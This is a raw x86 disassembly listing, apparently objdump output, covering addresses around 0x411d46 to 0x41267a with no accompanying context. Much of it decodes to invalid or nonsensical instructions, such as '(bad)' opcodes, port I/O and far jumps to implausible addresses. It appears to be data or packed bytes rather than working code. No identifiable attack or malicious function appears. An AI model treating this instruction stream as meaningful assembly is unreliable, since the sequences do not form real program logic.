  411d46:	inc    ebx
  411d47:	je     0x411d5a
  411d49:	test   al,0x68
  411d4b:	xor    BYTE PTR [eax],al
  411d4d:	pop    ebp
  411d4e:	iret   
  411d4f:	jmp    0x411d84
	...
  411d60:	std    
  411d61:	push   ecx
  411d62:	imul   al
  411d64:	mov    ds,WORD PTR [ecx]
  411d66:	(bad)  
  411d67:	(bad)  
  411d68:	cmp    eax,0xfa412006
  411d6d:	les    eax,FWORD PTR [ebx-0x4]
  411d70:	retf   0x5
  411d73:	add    BYTE PTR [edi],bh
  411d75:	cmp    dl,0x50
  411d78:	and    BYTE PTR [ecx],cl
  411d7a:	push   0x2
  411d7c:	gs arpl si,di
  411d7f:	(bad)  
  411d80:	jns    0x411d87
  411d82:	call   DWORD PTR ds:0x411e9d
  411d88:	rol    ebp,0xd
  411d8b:	test   BYTE PTR [ebx],dl
  411d8d:	or     DWORD PTR [eax],eax
  411d8f:	add    ch,al
  411d91:	adc    esi,0x58a20
  411d97:	mov    DWORD PTR [edi-0x13],0x57affff
  411d9e:	push   DWORD PTR [ebx-0x7a]
  411da1:	mov    esp,0x57ede043
  411da6:	push   es
  411da7:	pop    DWORD PTR [edi-0x5b]
  411daa:	lds    eax,FWORD PTR [ebp+0x12]
  411dad:	or     DWORD PTR [eax],eax
  411daf:	add    BYTE PTR [edx-0x3a],cl
  411db2:	inc    ebx
  411db3:	in     al,dx
  411db4:	dec    edx
  411db5:	add    eax,0x80850000
  411dba:	out    dx,al
  411dbb:	add    BYTE PTR [edx],bh
  411dbd:	add    eax,0xd107c700
  411dc2:	(bad)  
  411dc3:	inc    DWORD PTR [eax]
	...
  411dd1:	add    BYTE PTR [eax],al
  411dd3:	dec    edx
  411dd4:	add    eax,0x7952458d
  411dd9:	std    
  411dda:	jne    0x411e5a
  411ddc:	loope  0x411e0a
  411dde:	add    al,0xa
  411de0:	add    eax,0xa263c00b
  411de5:	jmp    0x5a74:0x41a8e82
  411dec:	pop    es
  411ded:	iret   
  411dee:	repz in al,dx
  411df0:	sub    DWORD PTR [ebp+0x3f2ea228],ebp
  411df6:	inc    esp
  411df7:	pop    ss
  411df8:	add    al,BYTE PTR cs:[eax]
  411dfb:	arpl   WORD PTR [ebx-0x1],dx
  411dfe:	(bad)  
  411dff:	es jp  0x411e04
  411e02:	add    BYTE PTR [ebx+0x2e],ah
  411e05:	inc    edi
  411e06:	je     0x411dd7
  411e08:	dec    edi
  411e09:	in     eax,dx
  411e0a:	loop   0x411e81
  411e0c:	in     eax,dx
  411e0d:	add    ecx,DWORD PTR [ebx]
  411e0f:	mov    ds:0xd8e7e9fa,eax
  411e14:	add    BYTE PTR [edi-0x2],0xe0
  411e18:	xor    DWORD PTR [ebx],ebp
  411e1a:	sub    eax,0x74022e22
  411e1f:	gs lahf 
  411e21:	in     eax,dx
  411e22:	fiadd  DWORD PTR [ebp-0x13]
  411e25:	add    eax,edi
  411e27:	data16 stc 
  411e29:	sbb    al,BYTE PTR [ecx+0x63]
  411e2c:	sub    eax,0xabe30002
  411e31:	(bad)
  411e34:	inc    edx
  411e35:	sti    
  411e36:	inc    BYTE PTR [eax]
	...
  411e44:	add    BYTE PTR [eax],al
  411e46:	idiv   BYTE PTR [ecx-0x29988bb9]
  411e4c:	sub    eax,0x472e6302
  411e51:	je     0x411eaa
  411e53:	mov    BYTE PTR [ebx+0x0],0x63
  411e57:	cs inc esi
  411e59:	xor    ah,BYTE PTR [ebx]
  411e5b:	test   DWORD PTR [edi-0x2],eax
  411e5e:	cmp    al,0xff
  411e60:	push   esp
  411e61:	lods   eax,DWORD PTR ds:[esi]
  411e62:	jnp    0x411e93
  411e64:	test   DWORD PTR [ecx+eax*4-0x2701b811],0x39fd0204
  411e6f:	adc    BYTE PTR [eax+eiz*8+0x16],ah
  411e73:	inc    eax
  411e74:	adc    eax,0xe905638b
  411e79:	add    esp,DWORD PTR [esp+ebx*8-0x7368bbd1]
  411e80:	or     al,0x84
  411e82:	and    BYTE PTR [ecx-0x80],al
  411e85:	in     eax,dx
  411e86:	add    al,0xc5
  411e88:	call   0xaa4790d8
  411e8d:	inc    edi
  411e8e:	dec    edx
  411e8f:	add    eax,0x56235d1
  411e94:	jmp    0xce3becf4
  411e99:	inc    edi
  411e9a:	mov    esp,0xbd47b999
  411e9f:	lods   al,BYTE PTR ds:[esi]
  411ea0:	jns    0x411eb8
  411ea2:	and    al,BYTE PTR ds:0xc6785b41
  411ea8:	call   0x411f08
	...
  411eb9:	push   edi
  411eba:	cld    
  411ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ebc:	inc    edi
  411ebd:	add    al,0x3c
  411ebf:	into   
  411ec0:	les    edx,FWORD PTR [edi+eiz*4+0x52215d4]
  411ec7:	add    DWORD PTR [esi+0x4a],0xb5dc8540
  411ece:	out    dx,al
  411ecf:	daa    
  411ed0:	add    al,0xb
  411ed2:	or     al,ah
  411ed4:	les    ebp,FWORD PTR [edi+eiz*1+0x7d]
  411ed8:	or     ah,BYTE PTR [edi+edi*1-0x30]
  411edc:	into   
  411edd:	mov    eax,esp
  411edf:	call   0xa82ddabf
  411ee4:	add    edi,DWORD PTR [ebx]
  411ee6:	adc    al,BYTE PTR es:[edi+0x45]
  411eea:	scas   al,BYTE PTR es:[edi]
  411eeb:	xchg   ecx,eax
  411eec:	push   ss
  411eed:	mov    ds:0x8843d105,al
  411ef2:	(bad)  
  411ef3:	(bad)  
  411ef4:	call   0x2e7a7481
  411ef9:	pushf  
  411efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411efb:	(bad)  
  411efd:	daa    
  411efe:	aas    
  411eff:	cmp    WORD PTR [edi-0x3c],si
  411f03:	inc    DWORD PTR [eax]
  411f05:	mov    eax,ds:0xa70efefc
  411f0a:	pop    es
  411f0b:	cli    
  411f0c:	push   es
  411f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f0e:	es xor al,0x3
  411f11:	pushf  
  411f12:	aas    
  411f13:	or     ch,BYTE PTR [ecx]
  411f15:	adc    edx,DWORD PTR [eax+ebp*8]
  411f18:	fistp  WORD PTR [ecx+0xf2fe3f]
	...
  411f2a:	add    BYTE PTR [eax],al
  411f2c:	and    BYTE PTR [edx+0x2c63a609],dh
  411f32:	dec    edx
  411f33:	sub    BYTE PTR [edi+0x4],ah
  411f36:	add    cl,ch
  411f38:	pusha  
  411f39:	lods   eax,DWORD PTR ds:[esi]
  411f3a:	add    al,ch
  411f3c:	pusha  
  411f3d:	add    eax,0x3e50d6e8
  411f42:	dec    BYTE PTR [edx-0x16bf35b7]
  411f48:	gs leave 
  411f4a:	sti    
  411f4b:	call   0x6c4124b7
  411f50:	mov    ds:0x73964f3a,eax
  411f55:	jmp    0xeb68:0x2d5f284a
  411f5c:	pusha  
  411f5d:	add    eax,0x1993a90b
  411f62:	(bad)  
  411f63:	mov    esp,0xe940ca49
  411f68:	or     BYTE PTR [eax+0x2e],bl
  411f6b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  411f6d:	inc    edi
  411f6e:	add    al,0x12
  411f70:	sbb    ch,al
  411f72:	(bad)  
  411f73:	call   0x414124d8
  411f78:	ds clc 
  411f7a:	inc    BYTE PTR [eax]
  411f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f7d:	fiadd  DWORD PTR [ebx+esi*1]
  411f80:	jne    0x411f49
  411f82:	push   si
  411f84:	pop    ebp
  411f85:	dec    eax
  411f86:	(bad)  
  411f87:	out    0x39,eax
  411f89:	sar    ebp,cl
  411f8b:	call   DWORD PTR [ebx-0x3d]
  411f8e:	push   ebx
  411f8f:	mov    eax,DWORD PTR [eax]
	...
  411f9d:	add    BYTE PTR [eax],al
  411f9f:	pop    dx
  411fa1:	add    eax,0xf801bae9
  411fa6:	jb     0x411fa3
  411fa8:	ret    0x6afd
  411fab:	or     bl,dl
  411fad:	mov    eax,0xb8020a01
  411fb2:	add    dl,bh
  411fb4:	add    DWORD PTR [eax],eax
  411fb6:	leave  
  411fb7:	cmp    BYTE PTR [esi],bh
  411fb9:	(bad)  
  411fba:	addr16 imul ebx,edx,0x3e
  411fbe:	add    dl,al
  411fc0:	push   edx
  411fc1:	inc    edx
  411fc3:	mov    ch,0x60
  411fc5:	clc    
  411fc6:	call   0xa4292945
  411fcb:	retf   
  411fcc:	add    DWORD PTR [eax],eax
  411fce:	call   0x3ee6d3
  411fd3:	mov    ds:0xf5fff0bb,al
  411fd8:	loopne 0x411fec
  411fda:	cmc    
  411fdb:	(bad)
  411fde:	cld    
  411fdf:	out    dx,eax
  411fe0:	(bad)  
  411fe1:	std    
  411fe2:	xor    DWORD PTR [edi+0x7a4149da],0x1
  411fe9:	je     0x412004
  411feb:	or     DWORD PTR [esi],eax
  411fed:	fld    TBYTE PTR [esi]
  411fef:	dec    ebx
  411ff0:	or     DWORD PTR [eax],eax
  411ff2:	je     0x412070
  411ff4:	enter  0xdb13,0xa4
  411ff8:	inc    edx
  411ff9:	inc    dh
  411ffb:	dec    edi
  411ffc:	ins    BYTE PTR es:[edi],dx
  411ffd:	daa    
  411ffe:	inc    ecx
  411fff:	dec    edx
  412000:	or     BYTE PTR [eax],al
	...
  412012:	arpl   WORD PTR [esi-0x33b739a5],bp
  412018:	inc    esp
  412019:	out    0x2b,eax
  41201b:	ret    
  41201c:	inc    esp
  41201d:	(bad)  
  41201e:	and    BYTE PTR [edi-0x34],dl
  412021:	call   0x718b4ec9
  412026:	(bad)  
  412027:	out    dx,eax
  412028:	inc    esp
  412029:	out    0x74,eax
  41202b:	sub    eax,0x21890002
  412030:	test   eax,0x531c312a
  412035:	or     BYTE PTR [ecx],0x23
  412038:	int    0x1
  41203a:	or     BYTE PTR [ecx],dh
  41203c:	push   edi
  41203d:	jmp    0x6ec:0xfe44a40b
  412044:	ins    BYTE PTR es:[edi],dx
  412045:	mul    ah
  412047:	sub    ebx,eax
  412049:	inc    esp
  41204b:	adc    al,BYTE PTR [ebx]
  41204d:	add    BYTE PTR [ebx+0x5b],ah
  412050:	sbb    eax,0x3ed2a74
  412055:	(bad)  
  412056:	jle    0x41202e
  412058:	stos   BYTE PTR es:[edi],al
  412059:	inc    eax
  41205a:	arpl   WORD PTR [ebx+0x1d],ax
  41205d:	jl     0x412079
  41205f:	in     eax,dx
  412060:	add    edi,edi
  412062:	xchg   BYTE PTR [esi+0x6b6340a9],ch
  412068:	sbb    eax,0x3ed3a84
  41206d:	(bad)  
  41206e:	ds mov dh,0xa9
  412071:	inc    eax
  412072:	arpl   WORD PTR [ebx+0x8c1d],dx
	...
  412084:	add    BYTE PTR [edx],ch
  412086:	in     eax,dx
  412087:	add    edi,edi
  412089:	inc    esi
  41208a:	fisubr WORD PTR [ecx+0x1dbb6340]
  412090:	xchg   esp,eax
  412091:	or     ch,ch
  412093:	add    edi,edi
  412095:	ds (bad) 
  412097:	test   eax,0x66056340
  41209c:	push   ds
  41209d:	neg    ebp
  41209f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120a0:	add    ecx,DWORD PTR [edx+eiz*8-0x78]
  4120a4:	stos   BYTE PTR es:[edi],al
  4120a5:	mov    ds:0x71e4e05,eax
  4120aa:	fisub  WORD PTR [edi-0x6f1dcbfd]
  4120b0:	stos   BYTE PTR es:[edi],al
  4120b1:	mov    ds:0xf71e3605,eax
  4120b6:	frstor [edi+0x58e21c03]
  4120bc:	stos   BYTE PTR es:[edi],al
  4120bd:	mov    ds:0xd71e1e05,eax
  4120c2:	frstor [edi+0x50e20403]
  4120c8:	stos   BYTE PTR es:[edi],al
  4120c9:	mov    ds:0xb71e0605,eax
  4120ce:	frstor [edi+0x28e1ec03]
  4120d4:	stos   BYTE PTR es:[edi],al
  4120d5:	mov    ds:0xa71dee05,eax
  4120da:	frstor [edi]
  4120dc:	add    al,0xd4
  4120de:	loope  0x412090
  4120e0:	frstor [ebx]
  4120e2:	add    eax,0xdd98e9d6
  4120e7:	daa    
  4120e8:	add    al,0x0
	...
  4120f6:	add    BYTE PTR [eax],al
  4120f8:	mov    esp,0x23dd98e1
  4120fd:	add    eax,0xdd90e9be
  412102:	daa    
  412103:	add    al,0xa4
  412105:	loope  0x412097
  412107:	frstor [ebx]
  412109:	add    eax,0xddb8e9a6
  41210e:	daa    
  41210f:	add    al,0x8c
  412111:	loope  0x41209b
  412113:	frstor [ebx]
  412115:	add    eax,0xdd80e98e
  41211a:	daa    
  41211b:	add    al,0x74
  41211d:	loope  0x4120af
  41211f:	frstor [ebx]
  412121:	add    eax,0x2f7a7600
  412126:	pop    eax
  412127:	sub    BYTE PTR [edi+0x3a],ah
  41212a:	and    al,0x59
  41212c:	ss (bad) 
  41212e:	call   FWORD PTR [ebp+0x3a]
  412131:	aaa    
  412132:	pop    eax
  412133:	test   al,0x60
  412135:	cmp    ah,BYTE PTR [ecx+edx*2]
  412138:	push   ds
  412139:	(bad)  
  41213a:	inc    DWORD PTR [ebp+0x4a]
  41213d:	aas    
  41213e:	pop    eax
  41213f:	test   al,0x60
  412141:	cmp    ah,BYTE PTR [ecx+ebp*8]
  412144:	push   es
  412145:	(bad)  
  412146:	jmp    FWORD PTR ds:0xa85a070a
  41214c:	pusha  
  41214d:	cmp    ah,BYTE PTR [ecx+esi*8]
  412150:	cs (bad) 
  412152:	call   DWORD PTR ds:0xa85a0efa
  412158:	pusha  
  412159:	cmp    ah,BYTE PTR [ecx+ebx*8]
	...
  412168:	add    BYTE PTR [eax],al
  41216a:	add    BYTE PTR [esi],dl
  41216c:	(bad)  
  41216d:	(bad)  
  41216e:	std    
  41216f:	sti    
  412170:	push   ss
  412171:	pop    edx
  412172:	test   al,0x60
  412174:	cmp    ah,BYTE PTR [ecx+edx*8]
  412177:	mov    esi,0xcbe5ffc5
  41217c:	push   ds
  41217d:	pop    edx
  41217e:	sub    BYTE PTR [edi+0x3a],ah
  412181:	and    al,0x9
  412183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412184:	(bad)  
  412187:	retf   
  412188:	out    0x59,al
  41218a:	sub    BYTE PTR [edi+0x3a],bl
  41218d:	and    al,0x11
  41218f:	(bad)  
  412190:	(bad)  
  412193:	mov    ebx,0x672859ee
  412198:	cmp    ah,BYTE PTR [ecx+ebx*8]
  41219b:	mov    dh,0xc5
  41219d:	call   FWORD PTR [ebp+0x2859f67b]
  4121a3:	pop    edi
  4121a4:	cmp    ah,BYTE PTR [ecx+edx*8]
  4121a7:	sahf   
  4121a8:	(bad)  
  4121ab:	(bad)  ds:0x13b5a3a
  4121b1:	jmp    DWORD PTR ds:0x3f5b3a
  4121b7:	int    0x2d
  4121b9:	inc    esi
  4121ba:	pop    edx
  4121bb:	or     eax,DWORD PTR [esi]
  4121bd:	jmp    DWORD PTR ds:0x3f57fe
  4121c3:	lods   eax,DWORD PTR ds:[esi]
  4121c4:	sub    eax,0x60b5a4e
  4121c9:	jmp    DWORD PTR ds:0x3f57d6
	...
  4121db:	add    BYTE PTR [eax],al
  4121dd:	add    BYTE PTR [ebp+0x2d],ch
  4121e0:	push   esi
  4121e1:	pop    edx
  4121e2:	sti    
  4121e3:	add    eax,0x57ee25ff
  4121e8:	aas    
  4121e9:	add    BYTE PTR ds:0xbb5a622d,bh
  4121ef:	add    eax,0x57de25ff
  4121f4:	aas    
  4121f5:	add    BYTE PTR [ebp+0x2d],ch
  4121f8:	outs   dx,BYTE PTR ds:[esi]
  4121f9:	pop    edx
  4121fa:	retf   
  4121fb:	add    eax,0x587625ff
  412200:	aas    
  412201:	add    ch,ch
  412203:	and    DWORD PTR [esi+0x5a],esi
  412206:	or     eax,DWORD PTR [esi]
  412208:	jmp    DWORD PTR ds:0x3f5b3e
  41220e:	lods   eax,DWORD PTR ds:[esi]
  41220f:	and    DWORD PTR [esi+0x5a],edi
  412212:	jnp    0x412215
  412214:	jmp    DWORD PTR ds:0x3f5b46
  41221a:	popf   
  41221b:	and    DWORD PTR [esi-0xfe84a6],eax
  412221:	and    eax,0x3f5b3e
  412226:	int    0x21
  412228:	mov    ds,WORD PTR [edx+0x4b]
  41222b:	add    edi,edi
  41222d:	and    eax,0x3f5ae2
  412232:	arpl   WORD PTR [ebx-0x12e6601a],dx
  412238:	add    edi,edi
  41223a:	ds enter 0x40dd,0x63
  41223f:	mov    ebx,0xabe6
	...
  412250:	add    BYTE PTR [ecx],cl
  412252:	in     eax,dx
  412253:	add    edi,edi
  412255:	xchg   dh,bh
  412257:	fld    QWORD PTR [eax+0x63]
  41225a:	lahf   
  41225b:	out    0xb3,al
  41225d:	test   eax,0x7eff026d
  412262:	xchg   esi,eax
  412263:	fld    QWORD PTR [eax+0x63]
  412266:	(bad)  
  412267:	out    0xbb,al
  412269:	cdq    
  41226a:	ins    DWORD PTR es:[edi],dx
  41226b:	add    bh,bh
  41226d:	xchg   dh,ch
  41226f:	fld    QWORD PTR [eax+0x63]
  412272:	out    dx,eax
  412273:	out    0xc7,al
  412275:	mov    ecx,0x3eff026d
  41227a:	repnz fld QWORD PTR [eax+0x63]
  41227e:	pop    ss
  41227f:	out    0xcf,eax
  412281:	test   eax,0x46ff026d
  412286:	repnz fld QWORD PTR [eax+0x63]
  41228a:	jmp    esi
  41228c:	xlat   BYTE PTR ds:[ebx]
  41228d:	mov    DWORD PTR [ebp+0x2],ebp
  412290:	(bad)  
  412291:	ds adc bl,dh
  412294:	inc    eax
  412295:	arpl   WORD PTR [edi],sp
  412297:	in     eax,0xdf
  412299:	cmp    ebp,ebp
  41229b:	add    edi,edi
  41229d:	xchg   BYTE PTR [edx-0x24],al
  4122a0:	inc    eax
  4122a1:	arpl   WORD PTR [edi-0x1b],cx
  4122a4:	out    0x19,eax
  4122a6:	in     eax,dx
  4122a7:	add    edi,edi
  4122a9:	jle    0x4122fd
  4122ab:	fadd   QWORD PTR [eax+0x63]
  4122ae:	ja     0x412295
  4122b0:	repz or ebp,ebp
  4122b3:	add    edi,edi
	...
  4122c1:	add    BYTE PTR [eax],al
  4122c3:	add    BYTE PTR [esi+0x76],al
  4122c6:	fadd   QWORD PTR [eax+0x63]
  4122c9:	add    eax,0x49984fb5
  4122ce:	lods   al,BYTE PTR ds:[esi]
  4122cf:	dec    edi
  4122d0:	cwde   
  4122d1:	dec    ecx
  4122d2:	popa   
  4122d3:	mov    DWORD PTR [eax+0x1],0xba623b6a
  4122da:	lock jnp 0x4122dd
  4122dd:	add    eax,0x1a103e9
  4122e2:	jmp    0xec42776b
  4122e7:	or     ebx,DWORD PTR [ebx]
  4122e9:	add    ebp,ecx
  4122eb:	add    esp,DWORD PTR [ebx+0x43]
  4122ee:	in     al,0x3
  4122f0:	loopne 0x41232e
  4122f2:	loopne 0x4122b2
  4122f4:	fs jge 0x4122db
  4122f7:	add    esp,DWORD PTR [ebx+0x5]
  4122fa:	sub    eax,DWORD PTR [edi]
  4122fc:	arpl   WORD PTR [eax+eax*2+0x710da613],ax
  412303:	or     DWORD PTR [ebx+0x5],esp
  412306:	jmp    0x6a468350
  41230b:	cmp    ebp,DWORD PTR [edx+edi*4-0x10]
  41230f:	jnp    0x41236d
  412311:	add    eax,0x12103e9
  412316:	jmp    0x84060f9f
  41231b:	or     ebp,DWORD PTR [ebx+0x6303e90a]
  412321:	inc    ebx
  412322:	in     al,dx
  412323:	add    ebx,DWORD PTR [esi+0x3e885]
	...
  412335:	add    BYTE PTR [eax],al
  412337:	arpl   WORD PTR [edx+0x5587bf0],di
  41233d:	jmp    0xe941c445
  412342:	add    BYTE PTR [ebx+0x6],ah
  412345:	jmp    0x814e594d
  41234a:	push   cs
  41234b:	arpl   WORD PTR ds:0x56041e9,ax
  412351:	add    ah,dh
  412353:	pusha  
  412354:	add    eax,DWORD PTR [eax]
  412356:	jmp    0xf9f922fe
  41235b:	pusha  
  41235c:	add    eax,0x55bab00
  412361:	cmp    eax,0x564e9
  412366:	or     al,0x67
  412368:	jge    0x41237b
  41236a:	jmp    0xe60328cf
  41236f:	pusha  
  412370:	cli    
  412371:	jmp    eax
  412373:	pusha  
  412374:	add    eax,0x12d8e17d
  412379:	add    cl,ch
  41237b:	pusha  
  41237c:	inc    ebx
  41237d:	add    ebp,ecx
  41237f:	arpl   WORD PTR ds:0xb860e910,ax
  412385:	pop    es
  412386:	xchg   ecx,eax
  412387:	dec    ebp
  412388:	add    eax,0x2a2e900
  41238d:	add    ah,bh
  41238f:	pusha  
  412390:	in     eax,0xff
  412392:	call   0xd1f922ba
  412397:	pusha  
  412398:	add    eax,0x2b00
	...
  4123a9:	add    BYTE PTR [ebx+0x5],bl
  4123ac:	cmp    eax,0xfe3720e9
  4123b1:	xchg   esp,eax
  4123b2:	push   0x60e9197d
  4123b7:	add    eax,0xf860edc2
  4123bc:	jmp    FWORD PTR [eax+0x5f]
  4123bf:	add    eax,0x1a58e17d
  4123c4:	add    cl,ch
  4123c6:	pusha  
  4123c7:	inc    ebx
  4123c8:	add    ebp,ecx
  4123ca:	ror    DWORD PTR [ebp+0x3c],1
  4123cd:	jmp    0xe6412832
  4123d2:	add    eax,DWORD PTR [esi-0x74]
  4123d5:	sbb    eax,0x8b1766
  4123da:	sti    
  4123db:	les    eax,FWORD PTR [edx]
  4123dd:	add    BYTE PTR [ecx],bh
  4123df:	sbb    DWORD PTR [edx],0xff028a04
  4123e5:	jne    0x41238e
  4123e7:	mov    edi,DWORD PTR [edi+0x10]
  4123ea:	jle    0x4123ee
  4123ec:	add    BYTE PTR [ecx+0x419fb],cl
  4123f2:	mov    al,BYTE PTR [edx-0x3b]
  4123f5:	add    DWORD PTR [esi+0x72fffffe],0xf3000002
  4123ff:	or     BYTE PTR [esi],0x4
  412402:	dec    edx
  412403:	add    al,BYTE PTR [ebx-0x1e184]
  412409:	mov    dl,bl
  41240b:	sbb    al,BYTE PTR [eax+eax*1]
	...
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    BYTE PTR [edx],bh
  41241e:	outs   dx,BYTE PTR ds:[esi]
  41241f:	or     DWORD PTR [edx-0x13ffbb5],ecx
  412425:	mov    cl,BYTE PTR [edx+0x23ec1ff]
  41242b:	shl    BYTE PTR [ecx],1
  41242d:	js     0x41242d
  41242f:	inc    DWORD PTR [edx+0x4168b]
  412435:	or     dh,bh
  412437:	jae    0x412456
  412439:	xchg   ecx,eax
  41243a:	or     DWORD PTR [esi],0x8901fa04
  412440:	xor    edx,0xcafffffd
  412446:	mov    esi,0x1fe1c7f
  41244b:	add    BYTE PTR [eax],cl
  41244d:	cli    
  41244e:	add    DWORD PTR [eax],eax
  412450:	mov    DWORD PTR [ebx+0x12],ecx
  412453:	add    al,0x0
  412455:	retf   0x878a
  412458:	sbb    BYTE PTR [esi+0x5bd00001],bh
  41245e:	les    eax,FWORD PTR [ecx+0x6306381]
  412464:	add    BYTE PTR [ebx+0x47],ah
  412467:	mov    dh,0x1c
  412469:	fsubr  DWORD PTR [ebx+edx*1-0x76d39cfc]
  412470:	cmp    BYTE PTR [ebx+0x28],0x2
  412474:	add    BYTE PTR [ebx],ah
  412476:	pop    edi
  412477:	sbb    BYTE PTR [ebx],0x67
  41247a:	sub    al,0x2
  41247c:	or     BYTE PTR [ebx+0x2c],ah
  41247f:	add    cl,BYTE PTR [ecx+0x0]
	...
  41248d:	add    BYTE PTR [eax],al
  41248f:	add    dl,ah
  412491:	cmp    eax,DWORD PTR [esi]
  412493:	add    BYTE PTR [ebx-0x5d],ah
  412496:	mov    dl,BYTE PTR [edi]
  412498:	addr16 sub al,0x2
  41249b:	mov    ah,BYTE PTR [edx+0x2a]
  41249e:	inc    edx
  41249f:	std    
  4124a0:	and    esp,DWORD PTR [edi-0x15173cfe]
  4124a6:	out    0x3,eax
  4124a8:	fdiv   DWORD PTR [edx-0x1a]
  4124ab:	add    ebp,DWORD PTR [esi+0x3532d37c]
  4124b1:	stos   BYTE PTR es:[edi],al
  4124b2:	retf   0xe9ff
  4124b5:	(bad)  
  4124b6:	and    dh,0x62
  4124b9:	or     eax,0x5ad6452c
  4124be:	rol    DWORD PTR [edx-0x104ce1e5],cl
  4124c4:	loopne 0x4124ba
  4124c6:	add    bh,BYTE PTR [ebp-0x1c313f4]
  4124cc:	(bad)  
  4124cd:	xchg   ecx,eax
  4124ce:	or     DWORD PTR [ecx+esi*2+0x6f],esi
  4124d2:	xchg   esi,edi
  4124d4:	(bad)  
  4124d5:	lds    ebx,FWORD PTR [edi]
  4124d7:	add    al,0x63
  4124d9:	push   ds
  4124da:	mov    ch,0x18
  4124dc:	fcomp  DWORD PTR [ebp+0x1e630413]
  4124e2:	mov    DWORD PTR [eax+0x22a7b],eax
  4124e8:	and    eax,DWORD PTR ds:0x9687a70
  4124ee:	jmp    0xf8c80ef6
  4124f3:	pop    es
	...
  412500:	add    BYTE PTR [eax],al
  412502:	add    BYTE PTR [ebx+0x5],ah
  412505:	bound  eax,QWORD PTR [edx+0x3e90954]
  41250b:	lods   eax,DWORD PTR ds:[esi]
  41250c:	inc    edi
  41250d:	out    0xb7,eax
  41250f:	push   0x7f
  412511:	rol    BYTE PTR [ecx],1
  412513:	mov    eax,0x748ba933
  412518:	and    dl,ch
  41251a:	push   ebx
  41251b:	fs push es
  41251d:	push   eax
  41251e:	pop    ds
  41251f:	addr16 add eax,0x805bb6e9
  412525:	adc    esp,DWORD PTR [bx+0x5]
  412529:	jmp    0xe54f08b8
  41252e:	add    esp,DWORD PTR [ebx-0x3b]
  412531:	pop    edi
  412532:	jp     0x4125ac
  412534:	or     ecx,ebp
  412536:	add    ebx,edx
  412538:	test   eax,edi
  41253a:	pop    es
  41253b:	arpl   WORD PTR ds:0x9548272,ax
  412541:	jmp    0xeb4e0e49
  412546:	pop    eax
  412547:	cs dec eax
  412549:	pop    ss
  41254a:	sub    ecx,esp
  41254c:	and    ah,bh
  41254e:	mov    esi,DWORD PTR [edx+edi*4+0x5a]
  412552:	fsub   DWORD PTR [ebx+0x5e]
  412555:	int3   
  412556:	pop    es
  412557:	arpl   WORD PTR ds:0x85d81a9c,ax
  41255d:	clc    
  41255e:	pop    es
  41255f:	arpl   WORD PTR ds:0x94c8260,ax
  412565:	jmp    0x41256d
	...
  412576:	mov    ds:0x5f1f3f7e,eax
  41257b:	add    eax,0x14e38ae9
  412580:	add    ch,ch
  412582:	pusha  
  412583:	add    eax,0x968688b
  412588:	add    cl,ch
  41258a:	xchg   edx,eax
  41258b:	inc    esi
  41258c:	add    BYTE PTR [ebp+0x6d],dl
  41258f:	jg     0x4125a0
  412591:	jmp    0x4125a1
  412593:	xor    al,cl
  412595:	popa   
  412596:	push   edi
  412597:	and    BYTE PTR [ecx],al
  412599:	cdq    
  41259a:	mov    edi,0x9cdda904
  41259f:	xor    edi,esi
  4125a1:	cmp    al,0x76
  4125a3:	add    BYTE PTR [eax-0x1cc7327],0x70
  4125aa:	ficomp WORD PTR [ebx]
  4125ac:	add    al,0xe9
  4125ae:	pusha  
  4125af:	lds    ecx,FWORD PTR [eax+0x95b50]
  4125b5:	jmp    0xed50aa99
  4125ba:	pusha  
  4125bb:	add    eax,0x97f708b
  4125c0:	add    cl,ch
  4125c2:	mov    al,0xe5
  4125c4:	pop    esi
  4125c5:	cvtpi2ps xmm0,QWORD PTR [ebp+0x3]
  4125c9:	jmp    0xcdcbfffb
  4125ce:	sbb    al,0x3
  4125d0:	push   esi
  4125d1:	sbb    bl,BYTE PTR [edi+0x584c82db]
  4125d7:	mov    ebx,0x8404
	...
  4125e8:	add    BYTE PTR [eax+0x5],bl
  4125eb:	add    cl,ch
  4125ed:	in     eax,dx
  4125ee:	scas   al,BYTE PTR es:[edi]
  4125ef:	and    ebx,ebp
  4125f1:	in     eax,0x3b
  4125f3:	sub    dh,BYTE PTR [edx+ebx*8]
  4125f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125f7:	and    ebp,ecx
  4125f9:	(bad)  
  4125fa:	adc    eax,DWORD PTR [edx+eax*2+0x248b12b3]
  412601:	in     al,0x58
  412603:	mov    WORD PTR [edx+0x67],?
  412606:	add    eax,0x30fa0000
  41260b:	sbb    BYTE PTR [esp+eax*8+0x41],dh
  41260f:	inc    eax
  412610:	test   DWORD PTR [ebx+0x7a83f474],eax
  412616:	push   es
  412617:	test   ecx,ecx
  412619:	daa    
  41261a:	add    DWORD PTR [ebx+0x1e3c8c0],eax
  412620:	or     DWORD PTR [edx],0x8
  412623:	inc    edi
  412624:	inc    esi
  412625:	cmp    DWORD PTR [edx+0x22],ebp
  412628:	sbb    al,0xbb
  41262a:	jne    0x4125f8
  41262c:	pop    edi
  41262d:	jl     0x41267b
  41262f:	pop    ecx
  412630:	ret    0x67e
  412633:	mov    edx,DWORD PTR [esi+eiz*2+0x5]
  412637:	push   ebp
  412638:	push   esi
  412639:	adc    ecx,edi
  41263b:	lds    eax,FWORD PTR [esi-0x1cd6e]
  412641:	mov    al,BYTE PTR [esi]
  412643:	add    BYTE PTR [eax],al
  412645:	add    BYTE PTR [eax],al
  412647:	test   cl,cl
  412649:	ins    DWORD PTR es:[edi],dx
  41264a:	mov    dl,0x2e
  41264c:	add    DWORD PTR [eax],eax
	...
  41265a:	add    BYTE PTR [eax],al
  41265c:	dec    edx
  41265d:	push   es
  41265e:	push   edi
  41265f:	mov    ecx,DWORD PTR [esi+0x52]
  412662:	adc    al,BYTE PTR [ebx+0x575ffbd]
  412668:	std    
  412669:	(bad)  
  41266a:	(bad)  
  41266b:	dec    DWORD PTR [edx-0x7d]
  41266e:	shr    BYTE PTR [ebx],0x85
  412671:	xchg   esi,eax
  412672:	cmp    BYTE PTR [eax],cl
  412674:	push   ss
  412675:	inc    eax
  412676:	dec    ebp
  412677:	inc    eax
  412678:	mov    bh,0xef
  41267a:	jae    0x412672
